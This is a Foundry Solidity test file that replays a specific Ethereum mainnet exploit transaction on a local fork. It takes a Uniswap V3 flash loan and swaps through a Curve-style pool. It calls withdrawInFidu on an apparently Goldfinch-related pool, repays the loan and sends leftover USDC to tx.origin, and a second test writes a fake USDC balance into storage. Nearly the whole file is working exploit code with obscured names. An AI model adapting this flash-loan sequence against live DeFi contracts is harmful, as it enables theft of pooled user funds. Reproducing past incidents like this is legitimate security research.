// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0xd56d801e07df9d8457973c3938f5d3e6343ec1ed11f4ebb76bc3f5cc73001707
// https://etherscan.io/address/0x86C595D81C8AB46D893065c3C674DA72555FE7c0

interface I {
    function get_dy(uint256, uint256, uint256) external payable;
    function sharePrice() external payable;
    function flash(address, uint256, uint256, bytes memory) external payable;
    function exchange(uint256, uint256, uint256, uint256, bool, address) external payable;
    function withdrawInFidu(uint256) external payable;
    function transfer(address, uint256) external payable;
    function goSeniorPool(address) external payable;
}

contract X5411 is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xd56d801e07df9d8457973c3938f5d3e6343ec1ed11f4ebb76bc3f5cc73001707");
    }

    address constant x5777 = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168;
    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant x80aa = 0x80aa1a80a30055DAA084E599836532F3e58c95E2;
    address constant x8481 = 0x8481a6EbAf5c7DABc3F7e09e44A89531fd31F822;
    address constant x84ac = 0x84AC02474c4656C88d4e08FCA63ff73070787C3d;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    function test() public {
        vm.createSelectFork("http://localhost:18545", 15036090); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xd56d801e07df9d8457973c3938f5d3e6343ec1ed11f4ebb76bc3f5cc73001707));

        // https://explorer.phalcon.xyz/tx/eth/0xd56d801e07df9d8457973c3938f5d3e6343ec1ed11f4ebb76bc3f5cc73001707
        x98404cf0();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 15036090); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1656360617);
        vm.roll(15036091);
        // https://explorer.phalcon.xyz/tx/eth/0xd56d801e07df9d8457973c3938f5d3e6343ec1ed11f4ebb76bc3f5cc73001707
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        x98404cf0();
    }

    function x98404cf0() public {
        I(x84ac).goSeniorPool(tx.origin);
        I(x8481).sharePrice();
        I(x80aa).get_dy(0, 1, 1000000000000000000);

        bytes memory b01 = abi.encode(0, 110000000000, tx.origin, x6b17, xa0b8, 100, 0, 0);
        I(x5777).flash(r, 0, 110000000000, b01);
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes memory) public {
        I(x80aa).get_dy(1, 0, 110000000000);
        I(x80aa).exchange(1, 0, 110000000000, 106667625499062823151255, false, r);
        I(x8481).withdrawInFidu(106667625499062823151255);
        I(xa0b8).transfer(x5777, 110011000000);
        I(xa0b8).transfer(tx.origin, 3841925651);
    }

    fallback() external payable {
        revert("no such function");
    }
}
